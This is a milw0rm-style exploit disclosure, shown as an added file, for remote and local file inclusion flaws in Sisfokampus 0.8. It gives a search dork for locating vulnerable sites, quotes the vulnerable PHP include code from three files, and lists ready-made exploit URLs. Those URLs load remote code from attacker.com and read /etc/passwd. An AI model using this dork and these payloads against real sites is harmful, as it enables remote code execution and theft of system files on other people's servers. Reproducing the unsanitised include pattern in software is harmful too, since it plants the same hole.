@@ -1,0 +1,83 @@
+#       Source Code = Sisfokampus 0.8
+#
+#       Website = www.Sisfokampus.net
+#
+#       Author = E. Setio Dewo (setio_dewo@telkom.net)
+#
+#       Dorkz : Allinurl: /index.php?exec=
+
+
+#       File Vuln :     index.php
+#                       print.php
+#                       download.php ( Local File Include )
+#
+#       Found by :      Wawan Firmansyah a.k.a Ang|n
+                        angkaramurka2003@yahoo.com
+
+###############################################################################
+
+# Source of index.php
+
+       -------------------------[Line 27]-----------------------------
+       <?php
+          if ($exec=='main.php' && file_exists("$themedir/main.php"))
+               include "$themedir/main.php";
+               else include $exec;
+       ?>
+       -------------------------[Line 31]------------------------------
+
+# Source Of print.php
+
+       -------------------------[Line 15]------------------------------
+       <?php
+       include_once "sysfo/sysfo.common.php";
+
+       if (isset($_REQUEST['print'])) {
+       $print = $_REQUEST['print'];
+       include "$print";
+       }
+       else die (DisplayHeader($fmtErrorMsg, $strNoDataTobePrint));
+
+       include "disconnectdb.php";
+       ?>
+       -------------------------[Line 25]-------------------------------
+
+# Source Of download.php
+
+       -------------------------[Line 1]--------------------------------
+       <?php
+       DisplayHeader($fmtPageTitle, $strDownload);
+       include "lib/file.common.php";
+       if (isset($_REQUEST['dir'])) $dir = $_REQUEST['dir'];
+       else $dir = $Download_dir;
+       if (substr($dir, -1) != '/' && substr($dir, -1) != '\\') $dir = "$dir/";
+       DisplayDownloadDir($dir);
+       ?>
+       -------------------------[Line 8]--------------------------------
+
+##################################################################################
+
+# Exploit of index.php
+
+       http://www.victim.com/index.php?exec=http://attacker.com/evilcode.txt?
+
+# Exploit of print.php
+       http://www.victim.com/print.php?print=http://attacker.com/evilcode.txt?
+       or
+       http://www.victim.com/index.php?exec=print&print=http://attacker.com/evilcode.txt?
+
+# Exploit of download.php
+
+       http://www.victim.com/index.php?exec=download&dir=/etc/passwd
+
+##################################################################################
+
+Greatz :
+       K-159 ( Thanks for ur Support & Advice )
+       #cyberbox community in dal.net
+       #indolinux in dal.net
+       #edp in dal.net
+
+##################################################################################
+
+# milw0rm.com [2006-11-25]
